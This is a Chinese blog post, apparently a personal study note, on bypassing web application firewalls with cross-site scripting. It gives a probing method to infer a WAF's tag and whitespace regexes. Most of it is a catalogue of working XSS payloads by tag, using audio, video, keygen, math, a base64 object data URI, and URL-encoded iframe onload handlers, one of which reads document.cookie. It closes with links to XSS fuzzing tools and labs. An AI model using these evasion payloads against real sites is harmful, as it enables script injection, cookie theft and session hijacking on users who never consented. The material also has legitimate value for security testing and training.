---
title: "[WAF绕过]XSS篇"
desc: TonyD0g
date: 2022-01-17 10:58:06
tags: WAF绕过
toc: true
---
<font size=4 >

<!-- more -->

## 1.XSS绕WAF的各种方式:

1. **WAF探测**
1. **标签语法替换**
2. **空格绕过**
3. **请求方式差异规则松懈绕过**
4. **异常/多种Method方法绕过**
5. **超大数据包绕过**
6. 字母大小写转换
7. 双关键字绕过


## 2.自动化工具
## 3.涉及资源
<br></br>

## 1.XSS绕WAF的各种方式:
## 1.**WAF探测**:
```
1、<svg – 如果通过，表明没有进行任何标签检测;

2、<dev – 如果无法通过，则为<[a-z]+;

3、x<dev – 如果通过，则为^<[a-z]+;

4、<dEv - 如果无法通过，则为<[a-zA-Z]+;

5、<d3V - 如果无法通过，则为<[a-zA-Z0-9]+;

6、<d|3v - 如果无法通过，则为<.+;

如果上述方式均无法探测成功，则说明目标站点部署的安全机制无法被绕过。这种方式的假阳性率非常高，因此不鼓励使用。
如果上述探测方式有一个可行，那么可用来构造Payload的机制就非常多了.
```
```
进一步猜测用于匹配标签和事件处理器间数据过滤器的正则表达式:
1、<tag xxx - 如果无法通过，则为{space};

2、<tag%09xxx - 如果无法通过，则为[\s];

3、<tag%09%09xxx - 如果无法通过，则为\s+;

4、<tag/xxx - 如果无法通过，则为[\s/]+;

5、<tag%0axxx- 如果无法通过，则为[\s\n]+;

6、<tag%0dxxx>- 如果无法通过，则为[\s\n\r+]+;

7、<tag/~/xxx - 如果无法通过，则为.*+;
```
## 2.**标签语法替换**:
常见的WAF过滤的标签:
```
<script>  <a>  <p>  <img>  <body> <button>  <var>  <div>  <iframe>  <object> <input> 
<textarea>  <keygen> <frameset>  <embed>  <svg>  <math>  <video>  <audio> <select>
```

audio:
```
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
```

video:
```
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>
```

div:
```
<div style="width:expression(alert(/1/))">1</div>     ie浏览器执行
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>   url编码绕过
```

math:
```
<math><a/xlink:href=javascript:prompt(1)>Xss

<math href="javascript:javascript:alert(1)">Xss</math>
```

button:
```
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1) >xss</button>
```

keygen:
```
<keygen/onfocus=prompt(1);>
<keygen onfocus=javascript:alert(1) autofocus>
```

object:
```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    
      解码：<script>alert(1)</script>
```

ifame:
```
<IFRAME width%3d"420" height%3d"315" frameborder%3d"0" onload%3d"alert(document.cookie)"><%2fIFRAME>
<iframe%2fsrc%3d"data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d">
<iframe srcdoc%3d'%26lt%3bbody onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b'>
```

## 3. **空格绕过**:
```
/**/ , %09
```

## 4. **请求方式差异规则松懈绕过**:
详见[WAF绕过]SQL注入篇: **3. 请求方式差异规则松懈绕过**

## 5. **异常/多种Method方法绕过**:
详见[WAF绕过]SQL注入篇: **4. 异常/多种Method方法绕过**

## 6. **超大数据包绕过**:
详见[WAF绕过]SQL注入篇: **5. 超大数据包绕过**

## 7. 字母大小写转换:
详见[WAF绕过]SQL注入篇: **16. 字母大小写转换**

## 8. 双关键字绕过:
详见[WAF绕过]SQL注入篇: **17. 双关键字绕过**

## 2.自动化工具:
1.XSStrike
```
https://github.com/s0md3v/XSStrike
```

## 3.**涉及资源**:
```
https://github.com/do0dl3/xss-labs

https://gitee.com/yhtmxl/imxss/

https://github.com/3xp10it/xwaf

https://xssfuzzer.com/fuzzer.html

https://github.com/s0md3v/XSStrike

https://bbs.pediy.com/thread-250852.htm

https://github.com/TheKingOfDuck/fuzzDicts
```

## 学习来源:
```
第二十八天waf绕过:
https://www.yuque.com/weiker/xiaodi/nqcvum

看我如何绕过WAF的XSS检测机制:
https://www.freebuf.com/articles/web/200180.html
```
</font>